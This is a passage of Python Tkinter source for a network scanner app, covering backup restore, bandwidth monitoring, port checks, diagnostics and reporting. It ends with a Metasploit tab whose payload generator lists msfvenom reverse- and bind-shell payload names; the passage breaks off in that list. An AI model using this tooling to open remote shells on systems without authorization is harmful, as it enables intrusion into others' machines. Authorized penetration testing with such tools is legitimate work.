            backup_dir = os.path.join(os.path.expanduser('~'), '.config', 'yap-network-scanner', 'backups')
        
        if not os.path.exists(backup_dir):
            return
        
        self.config_history_tree.delete(*self.config_history_tree.get_children())
        
        import json
        from datetime import datetime
        
        for filename in sorted(os.listdir(backup_dir), reverse=True):
            if filename.endswith('.json'):
                filepath = os.path.join(backup_dir, filename)
                try:
                    with open(filepath, 'r') as f:
                        data = json.load(f)
                    
                    timestamp = data.get('timestamp', 'Unknown')
                    if timestamp != 'Unknown':
                        try:
                            dt = datetime.fromisoformat(timestamp)
                            timestamp = dt.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            pass
                    
                    self.config_history_tree.insert('', tk.END, values=(
                        timestamp,
                        data.get('ip', 'Unknown'),
                        'Backup',
                        f"{os.path.getsize(filepath)} bytes"
                    ))
                except:
                    pass
    
    def restore_device_config(self):
        """Restore device configuration from backup."""
        selection = self.config_history_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a backup to restore.")
            return
        
        item = selection[0]
        values = self.config_history_tree.item(item, 'values')
        device_ip = values[1]
        
        # Use the same config directory as device storage
        if os.name == 'nt':  # Windows
            backup_dir = os.path.join(os.getenv('APPDATA', ''), 'YaP-Network-Scanner', 'backups')
        else:  # Linux/Mac
            backup_dir = os.path.join(os.path.expanduser('~'), '.config', 'yap-network-scanner', 'backups')
        
        # Find the most recent backup for this device
        import json
        from datetime import datetime
        
        backups = []
        for filename in os.listdir(backup_dir):
            if filename.startswith(device_ip) and filename.endswith('.json'):
                filepath = os.path.join(backup_dir, filename)
                try:
                    with open(filepath, 'r') as f:
                        data = json.load(f)
                    backups.append((filepath, data))
                except:
                    pass
        
        if not backups:
            messagebox.showerror("Error", "No backups found for this device.")
            return
        
        # Use most recent
        latest = max(backups, key=lambda x: x[1].get('timestamp', ''))
        
        result = messagebox.askyesno("Confirm Restore", 
                                   f"Restore configuration for {device_ip}?\n"
                                   f"Backup: {os.path.basename(latest[0])}")
        if result:
            data = latest[1]
            device = self.devices.get(device_ip)
            if device:
                # Restore all available fields
                device.custom_label = data.get('label', '')
                if 'mac' in data and data['mac'] != 'Unknown':
                    device.mac = data['mac']
                if 'hostname' in data and data['hostname'] != 'Unknown':
                    device.hostname = data['hostname']
                if 'vendor' in data:
                    device.vendor = data.get('vendor', 'Unknown')
                if 'ports' in data:
                    device.open_ports = data.get('ports', [])
                if 'subnet_mask' in data:
                    device.subnet_mask = data.get('subnet_mask', 'Unknown')
                if 'os_info' in data:
                    device.os_info = data.get('os_info', 'Unknown')
                
                self.storage.save_device(device)
                # Update the config display
                self.update_config_display()
                # Refresh device list to show updated name
                self.refresh_config_device_list()
                messagebox.showinfo("Success", "Configuration restored.")
            else:
                # Device not in current scan - save to storage for next scan
                restored_device = NetworkDevice(
                    ip=device_ip,
                    mac=data.get('mac', 'Unknown'),
                    hostname=data.get('hostname', 'Unknown'),
                    vendor=data.get('vendor', 'Unknown'),
                    status='Unknown',
                    open_ports=data.get('ports', []),
                    subnet_mask=data.get('subnet_mask', 'Unknown'),
                    os_info=data.get('os_info', 'Unknown'),
                    custom_label=data.get('label', '')
                )
                self.storage.save_device(restored_device)
                messagebox.showinfo("Success", f"Configuration restored and saved.\nDevice {device_ip} will appear in the next scan.")
    
    def create_bandwidth_tab(self, parent):
        """Create the Bandwidth Analysis tab."""
        # Control frame
        control_frame = ttk.LabelFrame(parent, text="Bandwidth Monitoring", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Interface selection
        interface_frame = ttk.Frame(control_frame)
        interface_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(interface_frame, text="Network Interface:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.bandwidth_interface_var = tk.StringVar()
        interface_combo = ttk.Combobox(interface_frame, textvariable=self.bandwidth_interface_var, 
                                      width=20, state="readonly")
        interface_combo.pack(side=tk.LEFT, padx=(0, 10))
        self.bandwidth_interface_combo = interface_combo
        
        ttk.Button(interface_frame, text="Refresh Interfaces", 
                  command=self.refresh_interfaces).pack(side=tk.LEFT, padx=(0, 10))
        self.bandwidth_start_btn = ttk.Button(interface_frame, text="Start Monitoring", 
                  command=self.start_bandwidth_monitoring)
        self.bandwidth_start_btn.pack(side=tk.LEFT, padx=(0, 5))
        self.bandwidth_stop_btn = ttk.Button(interface_frame, text="Stop Monitoring", 
                  command=self.stop_bandwidth_monitoring, state="disabled")
        self.bandwidth_stop_btn.pack(side=tk.LEFT)
        
        # Statistics display
        stats_frame = ttk.LabelFrame(parent, text="Bandwidth Statistics", padding="10")
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        
        stats_inner = ttk.Frame(stats_frame)
        stats_inner.pack(fill=tk.X)
        
        self.bandwidth_rx_label = ttk.Label(stats_inner, text="RX: 0 KB/s", font=("Consolas", 10, "bold"))
        self.bandwidth_rx_label.pack(side=tk.LEFT, padx=(0, 20))
        
        self.bandwidth_tx_label = ttk.Label(stats_inner, text="TX: 0 KB/s", font=("Consolas", 10, "bold"))
        self.bandwidth_tx_label.pack(side=tk.LEFT, padx=(0, 20))
        
        self.bandwidth_total_label = ttk.Label(stats_inner, text="Total: 0 KB/s", font=("Consolas", 10, "bold"))
        self.bandwidth_total_label.pack(side=tk.LEFT)
        
        # Traffic display
        traffic_frame = ttk.LabelFrame(parent, text="Traffic Analysis", padding="10")
        traffic_frame.pack(fill=tk.BOTH, expand=True)
        
        self.bandwidth_text = scrolledtext.ScrolledText(traffic_frame, wrap=tk.WORD, 
                                                       font=("Consolas", 9), height=20, state="disabled")
        self.bandwidth_text.pack(fill=tk.BOTH, expand=True)
        
        self.bandwidth_monitoring = False
        self.bandwidth_thread = None
    
    def refresh_interfaces(self):
        """Refresh network interface list."""
        try:
            import psutil
            interfaces = [iface for iface in psutil.net_io_counters(pernic=True).keys() 
                        if not iface.startswith('lo')]
            self.bandwidth_interface_combo['values'] = interfaces
            if interfaces:
                self.bandwidth_interface_combo.current(0)
        except ImportError:
            # Fallback to basic method
            try:
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
                interfaces = []
                for line in result.stdout.split('\n'):
                    if ': ' in line and 'lo:' not in line:
                        iface = line.split(':')[1].strip().split('@')[0]
                        if iface:
                            interfaces.append(iface)
                self.bandwidth_interface_combo['values'] = interfaces
                if interfaces:
                    self.bandwidth_interface_combo.current(0)
            except:
                messagebox.showerror("Error", "Could not detect network interfaces.")
    
    def start_bandwidth_monitoring(self):
        """Start bandwidth monitoring."""
        if self.bandwidth_monitoring:
            return  # Already monitoring
        
        interface = self.bandwidth_interface_var.get()
        if not interface:
            messagebox.showwarning("No Interface", "Please select a network interface.")
            return
        
        self.bandwidth_monitoring = True
        self.bandwidth_start_btn.config(state="disabled")
        self.bandwidth_stop_btn.config(state="normal")
        
        def monitor_bandwidth():
            try:
                import psutil
                last_rx = 0
                last_tx = 0
                
                while self.bandwidth_monitoring:
                    stats = psutil.net_io_counters(pernic=True).get(interface)
                    if stats:
                        rx = stats.bytes_recv
                        tx = stats.bytes_sent
                        
                        rx_diff = (rx - last_rx) / 1024  # KB/s
                        tx_diff = (tx - last_tx) / 1024
                        
                        self.root.after(0, lambda r=rx_diff, t=tx_diff: 
                                      self.update_bandwidth_display(r, t))
                        
                        last_rx = rx
                        last_tx = tx
                    
                    threading.Event().wait(1)
            except Exception as e:
                self.root.after(0, lambda: messagebox.showerror("Error", f"Monitoring error: {str(e)}"))
        
        self.bandwidth_thread = threading.Thread(target=monitor_bandwidth, daemon=True)
        self.bandwidth_thread.start()
    
    def stop_bandwidth_monitoring(self):
        """Stop bandwidth monitoring."""
        self.bandwidth_monitoring = False
        self.bandwidth_start_btn.config(state="normal")
        self.bandwidth_stop_btn.config(state="disabled")
        self.bandwidth_text.config(state="normal")
        self.bandwidth_text.insert(tk.END, f"\n{time.strftime('%H:%M:%S')} - Monitoring stopped.\n")
        self.bandwidth_text.see(tk.END)
        self.bandwidth_text.config(state="disabled")
    
    def update_bandwidth_display(self, rx, tx):
        """Update bandwidth display."""
        self.bandwidth_rx_label.config(text=f"RX: {rx:.1f} KB/s")
        self.bandwidth_tx_label.config(text=f"TX: {tx:.1f} KB/s")
        self.bandwidth_total_label.config(text=f"Total: {rx + tx:.1f} KB/s")
        
        self.bandwidth_text.config(state="normal")
        self.bandwidth_text.insert(tk.END, f"{time.strftime('%H:%M:%S')} - RX: {rx:.1f} KB/s, TX: {tx:.1f} KB/s\n")
        self.bandwidth_text.see(tk.END)
        self.bandwidth_text.config(state="disabled")
    
    def create_security_tab(self, parent):
        """Create the Security Management tab."""
        # Security scan controls
        scan_frame = ttk.LabelFrame(parent, text="Security Scan", padding="10")
        scan_frame.pack(fill=tk.X, pady=(0, 10))
        
        # IP input section
        ip_frame = ttk.Frame(scan_frame)
        ip_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(ip_frame, text="Target IP:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.security_ip_var = tk.StringVar()
        security_ip_entry = ttk.Entry(ip_frame, textvariable=self.security_ip_var, width=25, 
                                      font=("Consolas", 9))
        security_ip_entry.pack(side=tk.LEFT, padx=(0, 10))
        security_ip_entry.bind('<Return>', lambda e: self.scan_security_issues())
        
        ttk.Label(ip_frame, text="(Leave empty to scan all discovered devices)", 
                 font=("Segoe UI", 8), foreground="#666666").pack(side=tk.LEFT)
        
        # Button frame
        button_frame = ttk.Frame(scan_frame)
        button_frame.pack(fill=tk.X)
        
        ttk.Button(button_frame, text="Scan for Security Issues", 
                  command=self.scan_security_issues).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Check Open Ports", 
                  command=self.check_security_ports).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Use Selected Device", 
                  command=self.use_selected_for_security).pack(side=tk.LEFT)
        
        # Security issues display
        issues_frame = ttk.LabelFrame(parent, text="Security Issues", padding="10")
        issues_frame.pack(fill=tk.BOTH, expand=True)
        
        columns = ('Severity', 'Device', 'Issue', 'Description', 'Recommendation')
        self.security_tree = ttk.Treeview(issues_frame, columns=columns, show='headings', height=22)
        
        for col in columns:
            self.security_tree.heading(col, text=col)
            self.security_tree.column(col, width=200)
        
        scrollbar_sec = ttk.Scrollbar(issues_frame, orient=tk.VERTICAL, command=self.security_tree.yview)
        scrollbar_sec.pack(side=tk.RIGHT, fill=tk.Y)
        self.security_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.security_tree.config(yscrollcommand=scrollbar_sec.set)
        
        # Configure tags for severity
        self.security_tree.tag_configure("High", foreground="#CC0000")
        self.security_tree.tag_configure("Medium", foreground="#FF8800")
        self.security_tree.tag_configure("Low", foreground="#0066CC")
    
    def use_selected_for_security(self):
        """Use the selected device's IP for security scan."""
        if self.selected_device:
            self.security_ip_var.set(self.selected_device.ip)
        else:
            messagebox.showwarning("No Selection", "Please select a device from the device list first.")
    
    def scan_security_issues(self):
        """Scan for security issues."""
        target_ip = self.security_ip_var.get().strip()
        
        # If specific IP is provided, scan only that IP
        if target_ip:
            # Validate IP format
            try:
                import ipaddress
                ipaddress.IPv4Address(target_ip)
            except:
                messagebox.showerror("Invalid IP", f"Invalid IP address format: {target_ip}")
                return
            
            # Check if device exists in discovered devices
            device = self.devices.get(target_ip)
            if not device:
                # Device not in discovered list, create a basic device entry for scanning
                messagebox.showinfo("Device Not Found", 
                                  f"IP {target_ip} not in discovered devices.\n"
                                  f"Scanning this IP for security issues...")
                # Create a temporary device object for scanning
                from network_scanner import NetworkDevice
                device = NetworkDevice(
                    ip=target_ip,
                    mac_address="Unknown",
                    hostname="",
                    vendor="",
                    status="Unknown",
                    open_ports=[],
                    subnet_mask="Unknown"
                )
                # Try to get basic info
                try:
                    device.hostname = self.scanner.get_hostname(target_ip)
                    device.mac_address = self.scanner.get_mac_address(target_ip)
                    device.vendor = self.scanner._get_vendor_from_mac(device.mac_address)
                    # Quick port scan for common ports
                    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 8080]
                    device.open_ports = self.scanner.scan_ports(target_ip, common_ports)
                except:
                    pass
            
            devices_to_scan = [device]
        else:
            # Scan all discovered devices
            if not self.devices:
                messagebox.showinfo("No Devices", "Please scan the network first or enter a specific IP address.")
                return
            devices_to_scan = list(self.devices.values())
        
        self.security_tree.delete(*self.security_tree.get_children())
        
        issues = []
        
        for device in devices_to_scan:
            # Check for common security issues
            if device.open_ports:
                # Check for risky ports
                risky_ports = {21: "FTP", 23: "Telnet", 80: "HTTP", 135: "RPC", 
                             139: "NetBIOS", 445: "SMB", 1433: "MSSQL", 3306: "MySQL"}
                
                for port in device.open_ports:
                    if port in risky_ports:
                        issues.append((
                            "Medium",
                            device.ip,
                            f"Risky Port Open: {port}",
                            f"{risky_ports[port]} service detected",
                            f"Review if {risky_ports[port]} service is necessary"
                        ))
            
            # Check for devices without hostname
            if not device.hostname or device.hostname == device.ip:
                issues.append((
                    "Low",
                    device.ip,
                    "No Hostname",
                    "Device has no hostname configured",
                    "Configure hostname for better identification"
                ))
        
        for issue in issues:
            severity = issue[0]
            self.security_tree.insert('', tk.END, values=issue, tags=(severity,))
    
    def check_security_ports(self):
        """Check security-related ports."""
        self.scan_security_issues()
    
    def create_troubleshooting_tab(self, parent):
        """Create the Troubleshooting tab."""
        # Diagnostic tools
        tools_frame = ttk.LabelFrame(parent, text="Diagnostic Tools", padding="10")
        tools_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Tool selection
        tool_frame = ttk.Frame(tools_frame)
        tool_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(tool_frame, text="Tool:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.troubleshoot_tool_var = tk.StringVar(value="ping")
        ttk.Radiobutton(tool_frame, text="Ping", variable=self.troubleshoot_tool_var, 
                       value="ping").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(tool_frame, text="Traceroute", variable=self.troubleshoot_tool_var, 
                       value="traceroute").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(tool_frame, text="DNS Lookup", variable=self.troubleshoot_tool_var, 
                       value="dns").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(tool_frame, text="Port Test", variable=self.troubleshoot_tool_var, 
                       value="port").pack(side=tk.LEFT)
        
        # Target input
        target_frame = ttk.Frame(tools_frame)
        target_frame.pack(fill=tk.X)
        
        ttk.Label(target_frame, text="Target:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.troubleshoot_target_var = tk.StringVar()
        ttk.Entry(target_frame, textvariable=self.troubleshoot_target_var, width=25, 
                 font=("Consolas", 9)).pack(side=tk.LEFT, padx=(0, 10))
        
        ttk.Button(target_frame, text="Run Diagnostic", 
                  command=self.run_troubleshooting).pack(side=tk.LEFT)
        
        # Results display
        results_frame = ttk.LabelFrame(parent, text="Diagnostic Results", padding="10")
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        self.troubleshoot_text = scrolledtext.ScrolledText(results_frame, wrap=tk.WORD, 
                                                           font=("Consolas", 9), height=20, state="disabled")
        self.troubleshoot_text.pack(fill=tk.BOTH, expand=True)
    
    def run_troubleshooting(self):
        """Run troubleshooting diagnostic."""
        tool = self.troubleshoot_tool_var.get()
        target = self.troubleshoot_target_var.get().strip()
        
        if not target:
            messagebox.showwarning("Target Required", "Please enter a target.")
            return
        
        self.troubleshoot_text.config(state="normal")
        self.troubleshoot_text.delete(1.0, tk.END)
        self.troubleshoot_text.insert(tk.END, f"Running {tool} on {target}...\n\n")
        self.troubleshoot_text.config(state="disabled")
        
        def run_diagnostic():
            try:
                if tool == "ping":
                    result = subprocess.run(['ping', '-c', '4', target], 
                                          capture_output=True, text=True, timeout=10)
                elif tool == "traceroute":
                    result = subprocess.run(['traceroute', target], 
                                          capture_output=True, text=True, timeout=30)
                elif tool == "dns":
                    result = subprocess.run(['nslookup', target], 
                                          capture_output=True, text=True, timeout=10)
                elif tool == "port":
                    # Simple port test
                    import socket
                    port = 80
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        result_code = sock.connect_ex((target, port))
                        sock.close()
                        result = type('obj', (object,), {'stdout': f"Port {port}: {'Open' if result_code == 0 else 'Closed'}\n", 
                                                       'stderr': '', 'returncode': 0})()
                    except Exception as e:
                        result = type('obj', (object,), {'stdout': '', 'stderr': str(e), 'returncode': 1})()
                else:
                    result = type('obj', (object,), {'stdout': 'Unknown tool', 'stderr': '', 'returncode': 1})()
                
                output = result.stdout + result.stderr
                self.root.after(0, lambda: self.update_troubleshoot_output(output))
            except Exception as e:
                self.root.after(0, lambda: self.update_troubleshoot_output(f"Error: {str(e)}\n"))
        
        threading.Thread(target=run_diagnostic, daemon=True).start()
    
    def update_troubleshoot_output(self, output):
        """Update troubleshooting output."""
        self.troubleshoot_text.config(state="normal")
        self.troubleshoot_text.insert(tk.END, output + "\n")
        self.troubleshoot_text.see(tk.END)
        self.troubleshoot_text.config(state="disabled")
    
    def create_reporting_tab(self, parent):
        """Create the Reporting tab."""
        # Report generation controls
        control_frame = ttk.LabelFrame(parent, text="Report Generation", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Report type
        type_frame = ttk.Frame(control_frame)
        type_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(type_frame, text="Report Type:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 10))
        self.report_type_var = tk.StringVar(value="network_scan")
        ttk.Radiobutton(type_frame, text="Network Scan", variable=self.report_type_var, 
                       value="network_scan").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(type_frame, text="Security Audit", variable=self.report_type_var, 
                       value="security").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(type_frame, text="IPAM Report", variable=self.report_type_var, 
                       value="ipam").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(type_frame, text="Full Report", variable=self.report_type_var, 
                       value="full").pack(side=tk.LEFT)
        
        # Format selection
        format_frame = ttk.Frame(control_frame)
        format_frame.pack(fill=tk.X)
        
        ttk.Label(format_frame, text="Format:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 10))
        self.report_format_var = tk.StringVar(value="txt")
        ttk.Radiobutton(format_frame, text="Text", variable=self.report_format_var, 
                       value="txt").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(format_frame, text="HTML", variable=self.report_format_var, 
                       value="html").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Radiobutton(format_frame, text="JSON", variable=self.report_format_var, 
                       value="json").pack(side=tk.LEFT, padx=(0, 10))
        
        ttk.Button(format_frame, text="Generate Report", 
                  command=self.generate_report).pack(side=tk.LEFT, padx=(20, 0))
        
        # Report preview
        preview_frame = ttk.LabelFrame(parent, text="Report Preview", padding="10")
        preview_frame.pack(fill=tk.BOTH, expand=True)
        
        self.report_text = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD, 
                                                     font=("Consolas", 9), height=25, state="disabled")
        self.report_text.pack(fill=tk.BOTH, expand=True)
    
    def generate_report(self):
        """Generate a report."""
        report_type = self.report_type_var.get()
        format_type = self.report_format_var.get()
        
        self.report_text.config(state="normal")
        self.report_text.delete(1.0, tk.END)
        
        from datetime import datetime
        
        report = f"YaP Network Scanner Report\n"
        report += f"{'='*60}\n"
        report += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Report Type: {report_type.replace('_', ' ').title()}\n"
        report += f"{'='*60}\n\n"
        
        if report_type in ["network_scan", "full"]:
            report += f"Network Scan Results\n"
            report += f"{'-'*60}\n"
            report += f"Total Devices: {len(self.devices)}\n\n"
            
            for device in self.devices.values():
                report += f"Device: {device.get_display_name()}\n"
                report += f"  IP Address: {device.ip}\n"
                report += f"  MAC Address: {device.mac_address}\n"
                report += f"  Hostname: {device.hostname or 'N/A'}\n"
                report += f"  Vendor: {device.vendor or 'Unknown'}\n"
                report += f"  Status: {device.status}\n"
                if device.open_ports:
                    report += f"  Open Ports: {', '.join(map(str, device.open_ports))}\n"
                report += "\n"
        
        if report_type in ["security", "full"]:
            report += f"\nSecurity Audit\n"
            report += f"{'-'*60}\n"
            # Add security findings
            report += "Security scan results would appear here.\n\n"
        
        if report_type in ["ipam", "full"]:
            report += f"\nIP Address Management\n"
            report += f"{'-'*60}\n"
            report += "IPAM information would appear here.\n\n"
        
        self.report_text.insert(tk.END, report)
        self.report_text.config(state="disabled")
        
        # Save report
        try:
            reports_dir = os.path.join(os.path.expanduser("~"), ".yap-network-scanner", "reports")
            os.makedirs(reports_dir, exist_ok=True)
            
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{format_type}"
            filepath = os.path.join(reports_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write(report)
            
            messagebox.showinfo("Report Generated", f"Report saved to:\n{filepath}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save report: {str(e)}")
    
    def on_closing(self):
        """Handle window close event."""
        # Stop monitoring threads
        if self.monitoring_running:
            self.stop_monitoring()
        if self.bandwidth_monitoring:
            self.bandwidth_monitoring = False
        
        if HAS_PYSTRAY and self.tray_icon:
            self.hide_to_tray()
        else:
            self.root.destroy()
    
    def create_metasploit_tab(self, parent):
        """Create the Metasploit Framework tab."""
        import shutil
        
        # Check if Metasploit is installed
        has_metasploit = shutil.which('msfconsole') is not None
        metasploit_path = shutil.which('msfconsole') or 'Not found'
        
        # Status frame
        status_frame = ttk.LabelFrame(parent, text="Metasploit Status", padding="10")
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        status_text = f"Metasploit Framework: {'Installed' if has_metasploit else 'Not Found'}"
        if has_metasploit:
            status_text += f" ({metasploit_path})"
        status_label = ttk.Label(status_frame, text=status_text, 
                               foreground="#00AA00" if has_metasploit else "#CC0000",
                               font=("Segoe UI", 9, "bold"))
        status_label.pack(side=tk.LEFT)
        
        if not has_metasploit:
            install_hint = ttk.Label(status_frame, 
                                    text="Install Metasploit Framework to use this tab",
                                    foreground="#666666", font=("Segoe UI", 8))
            install_hint.pack(side=tk.LEFT, padx=(10, 0))
        
        # Main container with two columns
        main_container = ttk.Frame(parent)
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Left column - Console and Commands
        left_frame = ttk.Frame(main_container)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        # Console output - reduced height to fit better
        console_frame = ttk.LabelFrame(left_frame, text="Metasploit Console", padding="3")
        console_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        self.metasploit_console = scrolledtext.ScrolledText(console_frame, 
                                                           height=10, 
                                                           font=("Consolas", 8),
                                                           bg="#1e1e1e",
                                                           fg="#d4d4d4",
                                                           insertbackground="#d4d4d4")
        self.metasploit_console.pack(fill=tk.BOTH, expand=True)
        self.metasploit_console.insert(tk.END, "Metasploit Framework Console\n")
        self.metasploit_console.insert(tk.END, "=" * 50 + "\n")
        if has_metasploit:
            self.metasploit_console.insert(tk.END, "Metasploit is ready. Use the command input below.\n")
        else:
            self.metasploit_console.insert(tk.END, "Metasploit Framework not found. Please install it first.\n")
        self.metasploit_console.insert(tk.END, "=" * 50 + "\n\n")
        
        # Command input - more compact
        cmd_frame = ttk.Frame(left_frame)
        cmd_frame.pack(fill=tk.X)
        
        ttk.Label(cmd_frame, text="Cmd:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_cmd_var = tk.StringVar()
        cmd_entry = ttk.Entry(cmd_frame, textvariable=self.metasploit_cmd_var, 
                             font=("Consolas", 8))
        cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
        cmd_entry.bind('<Return>', lambda e: self.execute_metasploit_command())
        
        execute_btn = ttk.Button(cmd_frame, text="Execute", 
                                command=self.execute_metasploit_command,
                                state="normal" if has_metasploit else "disabled")
        execute_btn.pack(side=tk.LEFT)
        
        # Right column - Tools and Modules
        right_frame = ttk.Frame(main_container)
        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        # Quick Actions - removed Start/Stop buttons since commands work without them
        # Search modules - compact layout
        search_frame = ttk.Frame(right_frame)
        search_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(search_frame, text="Search Module:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_search_var = tk.StringVar()
        search_entry = ttk.Entry(search_frame, textvariable=self.metasploit_search_var,
                               font=("Consolas", 8))
        search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
        search_entry.bind('<Return>', lambda e: self.search_metasploit_modules())
        
        search_btn = ttk.Button(search_frame, text="Search",
                              command=self.search_metasploit_modules,
                              state="normal" if has_metasploit else "disabled")
        search_btn.pack(side=tk.LEFT)
        
        # Modules List
        modules_frame = ttk.LabelFrame(right_frame, text="Metasploit Modules", padding="10")
        modules_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Module filter/search
        filter_frame = ttk.Frame(modules_frame)
        filter_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(filter_frame, text="Filter:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.metasploit_module_filter = tk.StringVar()
        filter_entry = ttk.Entry(filter_frame, textvariable=self.metasploit_module_filter,
                                font=("Consolas", 9))
        filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        filter_entry.bind('<KeyRelease>', self.filter_metasploit_modules)
        
        # Module type filter
        self.metasploit_module_type = tk.StringVar(value="All")
        type_combo = ttk.Combobox(filter_frame, textvariable=self.metasploit_module_type,
                                 values=["All", "exploit", "auxiliary", "payload", "post", "encoder", "nop"],
                                 width=12, font=("Consolas", 9), state="readonly")
        type_combo.pack(side=tk.LEFT)
        type_combo.bind('<<ComboboxSelected>>', lambda e: self.filter_metasploit_modules(None))
        
        # Module list with scrollbar
        modules_list_frame = ttk.Frame(modules_frame)
        modules_list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Scrollbar for module list
        modules_scrollbar = ttk.Scrollbar(modules_list_frame)
        modules_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Listbox for modules
        self.metasploit_modules_list = tk.Listbox(modules_list_frame,
                                                 yscrollcommand=modules_scrollbar.set,
                                                 font=("Consolas", 9),
                                                 height=8)
        self.metasploit_modules_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        modules_scrollbar.config(command=self.metasploit_modules_list.yview)
        
        # Double-click to use module, single click to select
        self.metasploit_modules_list.bind('<Double-Button-1>', self.use_metasploit_module)
        self.metasploit_modules_list.bind('<Button-1>', self.select_metasploit_module)
        
        # Module selection buttons
        module_btn_frame = ttk.Frame(modules_frame)
        module_btn_frame.pack(fill=tk.X, pady=(5, 0))
        
        use_module_btn = ttk.Button(module_btn_frame, text="Use Selected Module",
                                    command=self.use_selected_metasploit_module,
                                    state="disabled")
        use_module_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.use_module_btn = use_module_btn
        
        self.load_modules_btn = ttk.Button(module_btn_frame, text="Load Modules",
                                           command=self.load_metasploit_modules,
                                           state="normal" if has_metasploit else "disabled")
        self.load_modules_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Store all modules for filtering
        self.metasploit_all_modules = []
        
        # Payload Generator - more compact
        payload_frame = ttk.LabelFrame(right_frame, text="Payload Generator", padding="5")
        payload_frame.pack(fill=tk.X, pady=(0, 5))
        
        # Payload type - compact
        payload_type_frame = ttk.Frame(payload_frame)
        payload_type_frame.pack(fill=tk.X, pady=(0, 3))
        
        ttk.Label(payload_type_frame, text="Type:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_payload_type = tk.StringVar(value="windows/meterpreter/reverse_tcp")
        
        # Comprehensive list of msfvenom payloads
        payload_list = [
            # Windows Meterpreter
            "windows/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_http",
            "windows/meterpreter/reverse_https",
            "windows/meterpreter/bind_tcp",
            "windows/x64/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_http",
            "windows/x64/meterpreter/reverse_https",
            "windows/x64/meterpreter/bind_tcp",
            # Windows Shell
            "windows/shell/reverse_tcp",
            "windows/shell/bind_tcp",
            "windows/x64/shell/reverse_tcp",
            "windows/x64/shell/bind_tcp",
            # Linux Meterpreter
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_http",
            "linux/x86/meterpreter/reverse_https",
            "linux/x86/meterpreter/bind_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_http",
            "linux/x64/meterpreter/reverse_https",
            "linux/x64/meterpreter/bind_tcp",
            # Linux Shell
            "linux/x86/shell/reverse_tcp",
            "linux/x86/shell/bind_tcp",
            "linux/x64/shell/reverse_tcp",
            "linux/x64/shell/bind_tcp",
            # Android
            "android/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_http",
            "android/meterpreter/reverse_https",
            # macOS
            "osx/x86/shell_reverse_tcp",
            "osx/x86/shell_bind_tcp",
            "osx/x64/shell_reverse_tcp",
            "osx/x64/meterpreter/reverse_tcp",
            # PHP
            "php/meterpreter/reverse_tcp",
            "php/meterpreter_reverse_tcp",
            "php/shell_reverse_tcp",
            # Python
            "python/meterpreter/reverse_tcp",
            "python/meterpreter/reverse_http",
